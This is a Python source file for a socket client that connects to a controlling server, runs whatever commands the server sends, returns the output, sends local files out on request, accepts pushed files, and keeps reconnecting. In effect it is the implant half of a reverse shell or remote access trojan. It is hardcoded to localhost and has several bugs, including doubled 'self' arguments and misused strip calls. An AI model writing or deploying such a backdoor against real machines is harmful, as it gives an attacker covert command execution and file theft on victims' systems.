import socket
import os
import subprocess
from time import sleep

class client:

    client_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server_ip=""
    server_port=""
    def __init__(self,server_ip,server_port):
        self.server_ip=server_ip
        self.server_port=server_port



    def download (self,path_input):
        if os.path.exists(path_input):
            chunk_read="Yes"
            with open(path_input,"rb") as file:
                chunk_read += file.read(2048).decode()
                chunk = file.read(2048).decode()
                while len(chunk) >0:
                    chunk=file.read(2048).decode()  
                    chunk_read+=chunk             
                chunk_read+="ENDOFMESSAGE"
                chunk_Byte=chunk_read.encode()
                self.client_socket.sendall(chunk_Byte)
                file.close()
                

    def upload(self,file_name):
        response = self.client_socket.recv(2048)
        total_response=""
        if response.decode().startswith("Yes"):
            response=response.decode().replace("Yes","")
            total_response+=response
            print("Downloading file...\n")
            if total_response.endswith("ENDOFMESSAGE"):
                total_response=total_response.replace("ENDOFMESSAGE", "")       
                exit
            else:
                while True:
                    response = self.client_socket.recv(2048)
                    total_response+=response.decode()
                    if total_response.endswith("ENDOFMESSAGE"):
                        total_response=total_response.replace("ENDOFMESSAGE", "")       
                        break

            with open(file_name,"xb") as file:
                file.write(total_response.encode())
                print("File downloaded successfully.\n")
                file.close()

        else:
            response = "No"
            self.client_socket.send(response.encode())
            exit


    def client_connect(self):
        self.client_socket.connect((self.server_ip,int(self.server_port)))
        try:
            while True:
                command=self.client_socket.recv(2048)
                command_string = command.decode()
                if command_string.startswith("cd"):
                    path_input=command_string.strip("cd ")

                    if os.path.exists(path_input):
                        os.chdir(path_input)
                        continue
                    else:
                        print("Path does not exist!\n")
                        continue

                if command_string.startswith("download"):
                    path_input=command_string.strip("download ")
                    self.download(self,path_input)
                    continue

                if command_string.startswith("upload"):
                    file_path = command_string.strip("upload ")
                    file_name_with_ext = os.path.basename(file_path)
                    if not os.path.exists("./Uploads"):
                        os.makedirs("./Uploads")
                    file_name="./Uploads/"+file_name_with_ext
                    while os.path.exists(file_name):
                        file_name+="(1)"
                    self.upload(self,file_name)
                    continue
                    
                    
                response = subprocess.run([command],shell=False,capture_output=True)
                if response.stderr.decode() == "":
                    response_byte = response.stdout
                else:
                    response_byte=response.stderr
                response_byte= response_byte.decode()+"ENDOFMESSAGE"
                self.client_socket.sendall(response_byte.encode())
                
        except ConnectionRefusedError: 
             print(f"Connection refused. Make sure the server is running at {self.server_ip}:{self.server_port}")
        except socket.gaierror:
            print(f"Address resolution error. Could not resolve {self.server_ip}.")
        except Exception: print("Exception occured")

        finally:
            print("Client connection closed.")
            if self.client_socket and not self.client_socket._closed:
                self.client_socket.close()



if __name__=="__main__":
    new_client = client("127.0.0.1","7900")
    new_client.client_connect()
    while True:
        try:
            new_client.client_connect()
        except KeyboardInterrupt:
            print("\nClient shutting down.")
            break
        sleep(2)